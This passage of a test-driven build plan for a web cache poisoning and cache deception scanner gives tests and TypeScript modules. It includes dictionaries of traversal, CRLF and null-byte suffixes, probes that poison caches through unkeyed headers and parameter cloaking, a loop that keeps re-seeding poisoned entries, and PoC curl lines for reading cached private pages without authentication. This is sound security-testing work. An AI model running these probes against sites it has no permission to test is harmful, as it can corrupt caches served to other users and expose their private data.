- [ ] **Step 1: Write failing test**

```ts
// tests/unit/send.test.ts
import { describe, it, expect, vi } from "vitest";
import { CaidoSender } from "../../src/caido/send";
import { Throttle } from "../../src/core/throttle";

describe("CaidoSender", () => {
  it("acquires throttle slot before send", async () => {
    const throttle = new Throttle({ rps: 100, burst: 1 });
    const acquire = vi.spyOn(throttle, "acquire");
    const client = { graphql: vi.fn().mockResolvedValue({ sendRequest: { request: { id: "r" }, response: { id: "p", status: 200, headers: "{}", body: "ok" } } }) } as any;
    const s = new CaidoSender(client, throttle);
    await s.send({ method: "GET", url: "https://x.test/", headers: {}, body: "" });
    expect(acquire).toHaveBeenCalledOnce();
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/send.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/caido/send.ts`**

```ts
import type { CaidoClient } from "./client.js";
import type { Throttle } from "../core/throttle.js";
import type { HttpMessage } from "../types.js";

const SEND_MUTATION = `
  mutation SendRequest($input: SendRequestInput!) {
    sendRequest(input: $input) {
      request { id }
      response { id status headers body }
    }
  }
`;

export interface SendResult {
  requestId: string;
  response: HttpMessage;
}

export class CaidoSender {
  constructor(private client: CaidoClient, private throttle: Throttle) {}

  async send(req: HttpMessage): Promise<SendResult> {
    await this.throttle.acquire();
    const data = await this.client.graphql<{
      sendRequest: {
        request: { id: string };
        response: { id: string; status: number; headers: string; body: string };
      };
    }>(SEND_MUTATION, {
      input: {
        method: req.method,
        url: req.url,
        headers: Object.entries(req.headers).map(([name, value]) => ({ name, value })),
        body: req.body
      }
    });
    return {
      requestId: data.sendRequest.request.id,
      response: {
        status: data.sendRequest.response.status,
        headers: JSON.parse(data.sendRequest.response.headers),
        body: data.sendRequest.response.body
      }
    };
  }
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/send.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/caido/send.ts tests/unit/send.test.ts && git commit -m "feat(caido): send_request wrapper with throttle"
```

---

## Task 13: Data files — header dictionaries + suffix lists

**Files:**
- Create: `data/unkeyed_headers.json`, `data/url_parser_suffixes.json`, `data/delimiters.json`, `data/static_extensions.json`

- [ ] **Step 1: Create `data/unkeyed_headers.json`**

```json
[
  "X-Forwarded-Host",
  "X-Forwarded-Scheme",
  "X-Forwarded-Proto",
  "X-Forwarded-Port",
  "X-Forwarded-For",
  "X-Host",
  "X-Original-URL",
  "X-Rewrite-URL",
  "X-Forwarded-Server",
  "X-HTTP-Method-Override",
  "X-Method-Override",
  "Forwarded",
  "User-Agent",
  "Accept-Language",
  "Content-Type"
]
```

- [ ] **Step 2: Create `data/url_parser_suffixes.json`**

```json
[
  ";.js",
  ".css",
  "/%2Fadmin",
  "/..%2fadmin",
  "%252e%252e",
  "%0d%0a",
  "?file=.js",
  "#.js",
  "/Admin",
  " ",
  "%2F..%2F"
]
```

- [ ] **Step 3: Create `data/delimiters.json`**

```json
[
  ";.css",
  "%23.css",
  "%3F.css",
  "%00.css",
  "%0A.css",
  "/..%2fx.css",
  "%2f..%2fstyle.css",
  "\\..\\x.css",
  ".aspx%3Frnd.js"
]
```

- [ ] **Step 4: Create `data/static_extensions.json`**

```json
[
  ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
  ".woff", ".woff2", ".ttf", ".otf", ".eot",
  ".pdf", ".avif", ".webp",
  ".mp3", ".mp4", ".webm", ".ogg"
]
```

- [ ] **Step 5: Commit**

```bash
git add data/ && git commit -m "data: header/suffix/delimiter/extension dictionaries"
```

---

## Task 14: Module A1 — Unkeyed-header sweep

**Files:**
- Create: `src/modules/cache_poison/unkeyed_header.ts`
- Test: `tests/unit/unkeyed_header.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/unkeyed_header.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepUnkeyedHeaders } from "../../src/modules/cache_poison/unkeyed_header";

describe("sweepUnkeyedHeaders", () => {
  it("returns finding when canary reflected in body + cache HIT confirmed on follow-up", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: { "x-cache": "MISS" }, body: '<base href="https://cnry-xx.evil.test/">' } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: { "x-cache": "HIT", age: "3" }, body: '<base href="https://cnry-xx.evil.test/">' } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, caido_request_id: "b", id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "", status: 200 };
    const findings = await sweepUnkeyedHeaders(sender, endpoint, baseline, ["X-Forwarded-Host"], () => "cnry-xx.evil.test", () => "cb1");
    expect(findings).toHaveLength(1);
    expect(findings[0].confidence).toBe("high");
    expect(findings[0].subtype).toBe("unkeyed-header");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/unkeyed_header.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/unkeyed_header.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import { parseCacheIndicators } from "../../core/cache.js";

export async function sweepUnkeyedHeaders(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  headers: string[],
  canaryFn: () => string,
  cbFn: () => string
): Promise<Finding[]> {
  const findings: Finding[] = [];
  for (const headerName of headers) {
    const canary = canaryFn();
    const cb = cbFn();
    const url = appendQuery(`https://${endpoint.host}${endpoint.path}`, "cb", cb);

    const poisonReq: HttpMessage = {
      method: "GET",
      url,
      headers: { ...baseline.headers, [headerName]: canary },
      body: ""
    };
    const poisoned = await sender.send(poisonReq);
    if (!reflected(poisoned.response.body, canary)) continue;

    const confirmReq: HttpMessage = { method: "GET", url, headers: baseline.headers, body: "" };
    const confirm = await sender.send(confirmReq);
    const cache = parseCacheIndicators(confirm.response.headers);
    const persisted = reflected(confirm.response.body, canary);

    const confidence = persisted && cache.hit ? "high" : persisted ? "medium" : "low";

    findings.push({
      id: `cp-${endpoint.id}-${headerName}`,
      module: "cache-poison",
      subtype: "unkeyed-header",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { header: headerName, canary },
      confidence,
      evidence: {
        probe_id: poisoned.requestId,
        confirm_id: confirm.requestId,
        cache_hit: cache.hit,
        reflection_loc: locateReflection(poisoned.response.body, canary)
      },
      poc_curl: `curl -H '${headerName}: ${canary}' '${url}'`,
      wiki_ref: "wiki/techniques/cache-poisoning/unkeyed-header.md"
    });
  }
  return findings;
}

function reflected(body: string, canary: string): boolean {
  return body.includes(canary);
}

function locateReflection(body: string, canary: string): string {
  const idx = body.indexOf(canary);
  if (idx < 0) return "none";
  const window = body.slice(Math.max(0, idx - 50), idx + canary.length + 50);
  if (/<script[^>]*src=/i.test(window)) return "body:<script src>";
  if (/<base[^>]*href=/i.test(window)) return "body:<base href>";
  if (/<link[^>]*href=/i.test(window)) return "body:<link href>";
  if (/<meta[^>]+og:image/i.test(window)) return "body:<meta og:image>";
  return "body:other";
}

function appendQuery(url: string, k: string, v: string): string {
  return url.includes("?") ? `${url}&${k}=${v}` : `${url}?${k}=${v}`;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/unkeyed_header.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/unkeyed_header.ts tests/unit/unkeyed_header.test.ts && git commit -m "feat(cache-poison): A1 unkeyed-header sweep"
```

---

## Task 15: Module A2 — Parameter cloaking

**Files:**
- Create: `src/modules/cache_poison/param_cloaking.ts`
- Test: `tests/unit/param_cloaking.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/param_cloaking.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepParamCloaking } from "../../src/modules/cache_poison/param_cloaking";

describe("sweepParamCloaking", () => {
  it("emits finding when fat GET body param reflected and HIT confirmed", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: { "x-cache": "MISS" }, body: "callback=cnry" } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: { "x-cache": "HIT" }, body: "callback=cnry" } })
        .mockResolvedValueOnce({ requestId: "p3", response: { status: 200, headers: {}, body: "" } })
        .mockResolvedValueOnce({ requestId: "p4", response: { status: 200, headers: {}, body: "" } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, caido_request_id: "b", id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "", status: 200 };
    const findings = await sweepParamCloaking(sender, endpoint, baseline, () => "cnry", () => "cb1");
    expect(findings.some((f) => f.subtype === "fat-get")).toBe(true);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/param_cloaking.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/param_cloaking.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import { parseCacheIndicators } from "../../core/cache.js";

interface Variant {
  subtype: string;
  build: (baseUrl: string, canary: string) => HttpMessage;
}

export async function sweepParamCloaking(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  canaryFn: () => string,
  cbFn: () => string
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const cb = cbFn();
  const baseUrl = appendQuery(`https://${endpoint.host}${endpoint.path}`, "cb", cb);

  const variants: Variant[] = [
    {
      subtype: "fat-get",
      build: (url, canary) => ({
        method: "GET",
        url,
        headers: { ...baseline.headers, "content-type": "application/x-www-form-urlencoded" },
        body: `injected=${canary}`
      })
    },
    {
      subtype: "semicolon-skew",
      build: (url, canary) => ({
        method: "GET",
        url: `${url};injected=${canary}`,
        headers: baseline.headers,
        body: ""
      })
    },
    {
      subtype: "excluded-param-padding",
      build: (url, canary) => ({
        method: "GET",
        url: `${url}&utm_source=x&injected=${canary}&fbclid=y`,
        headers: baseline.headers,
        body: ""
      })
    }
  ];

  for (const v of variants) {
    const canary = canaryFn();
    const probe = await sender.send(v.build(baseUrl, canary));
    if (!probe.response.body.includes(canary)) continue;
    const confirm = await sender.send({ method: "GET", url: baseUrl, headers: baseline.headers, body: "" });
    const cache = parseCacheIndicators(confirm.response.headers);
    const persisted = confirm.response.body.includes(canary);
    findings.push({
      id: `cp-${endpoint.id}-${v.subtype}`,
      module: "cache-poison",
      subtype: v.subtype,
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { canary, variant: v.subtype },
      confidence: persisted && cache.hit ? "high" : persisted ? "medium" : "low",
      evidence: { probe_id: probe.requestId, confirm_id: confirm.requestId, cache_hit: cache.hit },
      poc_curl: pocCurl(v.build(baseUrl, canary)),
      wiki_ref: "wiki/techniques/server-side/cache-parameter-cloaking.md"
    });
  }
  return findings;
}

function appendQuery(url: string, k: string, v: string): string {
  return url.includes("?") ? `${url}&${k}=${v}` : `${url}?${k}=${v}`;
}

function pocCurl(req: HttpMessage): string {
  const headers = Object.entries(req.headers).map(([k, v]) => `-H '${k}: ${v}'`).join(" ");
  const body = req.body ? `--data-raw '${req.body}'` : "";
  return `curl -X ${req.method} ${headers} ${body} '${req.url}'`.trim();
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/param_cloaking.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/param_cloaking.ts tests/unit/param_cloaking.test.ts && git commit -m "feat(cache-poison): A2 parameter cloaking (fat-get, semicolon, excluded-param)"
```

---

## Task 16: Module A3 — URL-parser discrepancy

**Files:**
- Create: `src/modules/cache_poison/url_parser.ts`
- Test: `tests/unit/url_parser_cp.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/url_parser_cp.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepUrlParser } from "../../src/modules/cache_poison/url_parser";

describe("sweepUrlParser", () => {
  it("flags candidates when origin still serves dynamic content + cache HIT under static-looking key", async () => {
    const sender = {
      send: vi.fn().mockResolvedValue({
        requestId: "r",
        response: { status: 200, headers: { "x-cache": "HIT", "content-type": "text/html" }, body: '{"profile":"alice"}' }
      })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/api/profile", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/api/profile", headers: {}, body: "", status: 200 };
    const findings = await sweepUrlParser(sender, endpoint, baseline, [";.js"]);
    expect(findings).toHaveLength(1);
    expect(findings[0].subtype).toBe("static-path-deception");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/url_parser_cp.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/url_parser.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import { parseCacheIndicators } from "../../core/cache.js";

export async function sweepUrlParser(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  suffixes: string[]
): Promise<Finding[]> {
  const findings: Finding[] = [];
  for (const suffix of suffixes) {
    const url = `https://${endpoint.host}${endpoint.path}${suffix}`;
    const probe = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
    const cache = parseCacheIndicators(probe.response.headers);
    const dynamicSignal =
      probe.response.body.length > 200 &&
      !/^\s*[#\.]/.test(probe.response.body) &&
      probe.response.status >= 200 && probe.response.status < 300;

    if (cache.hit && dynamicSignal) {
      findings.push({
        id: `cp-${endpoint.id}-urlparser-${encodeURIComponent(suffix)}`,
        module: "cache-poison",
        subtype: "static-path-deception",
        endpoint: `${endpoint.method} ${endpoint.path}`,
        primitive: { suffix },
        confidence: "medium",
        evidence: {
          probe_id: probe.requestId,
          cache_hit: cache.hit,
          status: probe.response.status,
          body_len: probe.response.body.length
        },
        poc_curl: `curl '${url}'`,
        wiki_ref: "wiki/techniques/cache-poisoning/url-parser-discrepancy.md"
      });
    }
  }
  return findings;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/url_parser_cp.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/url_parser.ts tests/unit/url_parser_cp.test.ts && git commit -m "feat(cache-poison): A3 URL-parser discrepancy / static path deception"
```

---

## Task 17: Module A4 — Cloudflare cache-key header overflow

**Files:**
- Create: `src/modules/cache_poison/cf_header_overflow.ts`
- Test: `tests/unit/cf_header_overflow.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cf_header_overflow.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepCfHeaderOverflow } from "../../src/modules/cache_poison/cf_header_overflow";

describe("sweepCfHeaderOverflow", () => {
  it("returns lead when method-override succeeds with junk header pad", async () => {
    const sender = {
      send: vi.fn().mockResolvedValue({
        requestId: "r",
        response: { status: 200, headers: { "cf-cache-status": "HIT", "content-length": "0" }, body: "" }
      })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/static/app.js", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/static/app.js", headers: {}, body: "", status: 200 };
    const findings = await sweepCfHeaderOverflow(sender, endpoint, baseline, "cloudflare");
    expect(findings[0]?.subtype).toBe("cf-header-overflow");
  });

  it("skips when CDN family not cloudflare", async () => {
    const sender = { send: vi.fn() } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "", status: 200 };
    const findings = await sweepCfHeaderOverflow(sender, endpoint, baseline, null);
    expect(findings).toHaveLength(0);
    expect(sender.send).not.toHaveBeenCalled();
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cf_header_overflow.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/cf_header_overflow.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { CdnFamily } from "../../core/cdn.js";

export async function sweepCfHeaderOverflow(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  cdn: CdnFamily | null
): Promise<Finding[]> {
  if (cdn !== "cloudflare") return [];
  const findings: Finding[] = [];
  const url = `https://${endpoint.host}${endpoint.path}`;
  for (const cap of [100, 50, 200]) {
    const padded: Record<string, string> = { ...baseline.headers };
    for (let i = 0; i < cap; i++) padded[`X-Junk-${i}`] = "a";
    padded["X-HTTP-Method-Override"] = "HEAD";
    const probe = await sender.send({ method: "GET", url, headers: padded, body: "" });
    const hit = /HIT/i.test(probe.response.headers["cf-cache-status"] ?? "");
    const empty = (probe.response.headers["content-length"] ?? "") === "0";
    if (hit && empty) {
      findings.push({
        id: `cp-${endpoint.id}-cf-overflow-${cap}`,
        module: "cache-poison",
        subtype: "cf-header-overflow",
        endpoint: `${endpoint.method} ${endpoint.path}`,
        primitive: { junk_count: cap, override: "X-HTTP-Method-Override: HEAD" },
        confidence: "high",
        evidence: { probe_id: probe.requestId, hit, content_length: "0" },
        poc_curl: `# pad with ${cap} junk headers, then\ncurl -H 'X-HTTP-Method-Override: HEAD' '${url}'`,
        wiki_ref: "wiki/techniques/server-side/cloudflare-cache-key-header-overflow.md"
      });
      break;
    }
  }
  return findings;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cf_header_overflow.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/cf_header_overflow.ts tests/unit/cf_header_overflow.test.ts && git commit -m "feat(cache-poison): A4 Cloudflare cache-key header overflow"
```

---

## Task 18: Module A5 — CDN quirks

**Files:**
- Create: `src/modules/cache_poison/cdn_quirks.ts`
- Test: `tests/unit/cdn_quirks.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cdn_quirks.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepCdnQuirks } from "../../src/modules/cache_poison/cdn_quirks";

describe("sweepCdnQuirks", () => {
  it("flags host-casing mismatch when bodies differ", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: {}, body: "lowercase" } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: {}, body: "mixedcase" } })
        .mockResolvedValueOnce({ requestId: "p3", response: { status: 405, headers: {}, body: "" } })
        .mockResolvedValue({ requestId: "px", response: { status: 200, headers: {}, body: "" } })
    } as any;
    const endpoint = { method: "GET", host: "target.com", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://target.com/", headers: {}, body: "", status: 200 };
    const findings = await sweepCdnQuirks(sender, endpoint, baseline);
    expect(findings.find((f) => f.subtype === "host-casing")).toBeTruthy();
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cdn_quirks.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/cdn_quirks.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";

const HOP_BY_HOP_CANDIDATES = ["X-Forwarded-For", "Authorization", "Cookie", "Content-Length"];

export async function sweepCdnQuirks(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const url = `https://${endpoint.host}${endpoint.path}`;

  const lower = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
  const mixed = await sender.send({
    method: "GET",
    url,
    headers: { ...baseline.headers, Host: scrambleCase(endpoint.host) },
    body: ""
  });
  if (lower.response.body !== mixed.response.body) {
    findings.push({
      id: `cp-${endpoint.id}-host-casing`,
      module: "cache-poison",
      subtype: "host-casing",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { host_variant: scrambleCase(endpoint.host) },
      confidence: "low",
      evidence: { lower_id: lower.requestId, mixed_id: mixed.requestId },
      poc_curl: `curl -H 'Host: ${scrambleCase(endpoint.host)}' '${url}'`,
      wiki_ref: "wiki/techniques/server-side/cloudflare-cache-key-header-overflow.md"
    });
  }

  const purge = await sender.send({ method: "PURGE", url, headers: baseline.headers, body: "" });
  if (purge.response.status >= 200 && purge.response.status < 400) {
    findings.push({
      id: `cp-${endpoint.id}-purge`,
      module: "cache-poison",
      subtype: "purge-exposed",
      endpoint: `PURGE ${endpoint.path}`,
      primitive: {},
      confidence: "medium",
      evidence: { probe_id: purge.requestId, status: purge.response.status },
      poc_curl: `curl -X PURGE '${url}'`,
      wiki_ref: "wiki/techniques/cache-poisoning/SUMMARY.md"
    });
  }

  for (const hbh of HOP_BY_HOP_CANDIDATES) {
    const probe = await sender.send({
      method: "GET",
      url,
      headers: { ...baseline.headers, Connection: hbh },
      body: ""
    });
    if (probe.response.status !== baseline.status) {
      findings.push({
        id: `cp-${endpoint.id}-hop-${hbh}`,
        module: "cache-poison",
        subtype: "hop-by-hop-strip",
        endpoint: `${endpoint.method} ${endpoint.path}`,
        primitive: { stripped_header: hbh },
        confidence: "low",
        evidence: { probe_id: probe.requestId, baseline_status: baseline.status, probe_status: probe.response.status },
        poc_curl: `curl -H 'Connection: ${hbh}' '${url}'`,
        wiki_ref: "wiki/techniques/server-side/hop-by-hop-smuggling.md"
      });
    }
  }
  return findings;
}

function scrambleCase(host: string): string {
  return host
    .split("")
    .map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
    .join("");
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cdn_quirks.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/cdn_quirks.ts tests/unit/cdn_quirks.test.ts && git commit -m "feat(cache-poison): A5 CDN quirks (host casing, PURGE, hop-by-hop)"
```

---

## Task 19: Module A6 — Persistence loop

**Files:**
- Create: `src/modules/cache_poison/persistence_loop.ts`
- Test: `tests/unit/persistence_loop.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/persistence_loop.test.ts
import { describe, it, expect, vi } from "vitest";
import { measurePersistence } from "../../src/modules/cache_poison/persistence_loop";

describe("measurePersistence", () => {
  it("reseeds N times and reports survival seconds", async () => {
    const sender = {
      send: vi.fn().mockResolvedValue({
        requestId: "r",
        response: { status: 200, headers: { "x-cache": "HIT", age: "5" }, body: "poison" }
      })
    } as any;
    const result = await measurePersistence(sender, "https://x.test/asset.js", { "X-Forwarded-Host": "evil" }, 3);
    expect(result.reseeds).toBe(3);
    expect(result.survivalSeconds).toBeGreaterThanOrEqual(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/persistence_loop.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/persistence_loop.ts`**

```ts
import type { CaidoSender } from "../../caido/send.js";

export interface PersistenceResult {
  reseeds: number;
  survivalSeconds: number;
  finalHit: boolean;
}

export async function measurePersistence(
  sender: CaidoSender,
  url: string,
  poisonHeaders: Record<string, string>,
  shots: number
): Promise<PersistenceResult> {
  for (let i = 0; i < shots; i++) {
    await sender.send({ method: "GET", url, headers: poisonHeaders, body: "" });
  }
  const probe = await sender.send({ method: "GET", url, headers: {}, body: "" });
  const finalHit = /HIT/i.test(probe.response.headers["x-cache"] ?? "");
  const age = parseInt(probe.response.headers["age"] ?? "0", 10) || 0;
  return { reseeds: shots, survivalSeconds: age, finalHit };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/persistence_loop.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/persistence_loop.ts tests/unit/persistence_loop.test.ts && git commit -m "feat(cache-poison): A6 persistence loop measurement"
```

---

## Task 20: Cache-poison module orchestrator

**Files:**
- Create: `src/modules/cache_poison/index.ts`
- Test: `tests/unit/cache_poison_index.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cache_poison_index.test.ts
import { describe, it, expect, vi } from "vitest";
import { runCachePoison } from "../../src/modules/cache_poison";

describe("runCachePoison", () => {
  it("skips endpoint without cache layer", async () => {
    const sender = { send: vi.fn() } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "", status: 200 };
    const findings = await runCachePoison(sender, endpoint, baseline);
    expect(findings).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cache_poison_index.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_poison/index.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import { hasCacheLayer } from "../../core/cache.js";
import { fingerprintCdn } from "../../core/cdn.js";
import { canary, cacheBuster } from "../../core/rand.js";
import { sweepUnkeyedHeaders } from "./unkeyed_header.js";
import { sweepParamCloaking } from "./param_cloaking.js";
import { sweepUrlParser } from "./url_parser.js";
import { sweepCfHeaderOverflow } from "./cf_header_overflow.js";
import { sweepCdnQuirks } from "./cdn_quirks.js";
import unkeyedHeaders from "../../../data/unkeyed_headers.json" with { type: "json" };
import urlSuffixes from "../../../data/url_parser_suffixes.json" with { type: "json" };

export async function runCachePoison(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage
): Promise<Finding[]> {
  if (!hasCacheLayer(baseline.headers)) return [];
  const cdn = fingerprintCdn(baseline.headers);
  const out: Finding[] = [];
  out.push(...(await sweepUnkeyedHeaders(sender, endpoint, baseline, unkeyedHeaders as string[], canary, cacheBuster)));
  out.push(...(await sweepParamCloaking(sender, endpoint, baseline, canary, cacheBuster)));
  out.push(...(await sweepUrlParser(sender, endpoint, baseline, urlSuffixes as string[])));
  out.push(...(await sweepCfHeaderOverflow(sender, endpoint, baseline, cdn)));
  out.push(...(await sweepCdnQuirks(sender, endpoint, baseline)));
  return out;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cache_poison_index.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_poison/index.ts tests/unit/cache_poison_index.test.ts && git commit -m "feat(cache-poison): orchestrator wires A1-A5"
```

---

## Task 21: Module B1 — Path-append static-extension fuzz

**Files:**
- Create: `src/modules/cache_deception/path_append.ts`
- Test: `tests/unit/path_append.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/path_append.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepPathAppend } from "../../src/modules/cache_deception/path_append";

describe("sweepPathAppend", () => {
  it("returns high-confidence when no-auth response contains marker", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: { "x-cache": "MISS" }, body: "alice@example.com" } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: { "x-cache": "HIT" }, body: "alice@example.com" } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/account", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/account", headers: { cookie: "s=1" }, body: "", status: 200 };
    const markers = [{ kind: "email" as const, value: "alice@example.com" }];
    const findings = await sweepPathAppend(sender, endpoint, baseline, markers, [".css"]);
    expect(findings[0].confidence).toBe("high");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/path_append.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/path_append.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { Marker } from "../../core/marker.js";
import { parseCacheIndicators } from "../../core/cache.js";
import { bodyParity } from "../../core/diff.js";

export async function sweepPathAppend(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  markers: Marker[],
  extensions: string[]
): Promise<Finding[]> {
  const findings: Finding[] = [];
  for (const ext of extensions) {
    const url = `https://${endpoint.host}${endpoint.path}/poc${ext}`;

    const auth = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
    const noAuth = await sender.send({ method: "GET", url, headers: stripAuth(baseline.headers), body: "" });
    const cache = parseCacheIndicators(noAuth.response.headers);
    const leaked = markers.some((m) => noAuth.response.body.includes(m.value));
    const parity = bodyParity(auth.response.body, noAuth.response.body);

    let confidence: "high" | "medium" | "low" | null = null;
    if (leaked) confidence = "high";
    else if (parity >= 0.9 && cache.hit) confidence = "medium";
    else if (cache.hit) confidence = "low";
    if (!confidence) continue;

    findings.push({
      id: `cd-${endpoint.id}-pathappend-${ext}`,
      module: "cache-deception",
      subtype: "path-append",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { suffix: `/poc${ext}` },
      confidence,
      evidence: {
        auth_id: auth.requestId,
        noauth_id: noAuth.requestId,
        leaked,
        parity,
        cache_hit: cache.hit
      },
      poc_curl: `curl '${url}'  # no auth — read cached private response`,
      wiki_ref: "wiki/techniques/server-side/web-cache-deception.md"
    });
  }
  return findings;
}

function stripAuth(h: Record<string, string>): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of Object.keys(h)) {
    if (k.toLowerCase() === "cookie" || k.toLowerCase() === "authorization") continue;
    o[k] = h[k];
  }
  return o;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/path_append.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/path_append.ts tests/unit/path_append.test.ts && git commit -m "feat(cache-deception): B1 path-append static-extension fuzz"
```

---

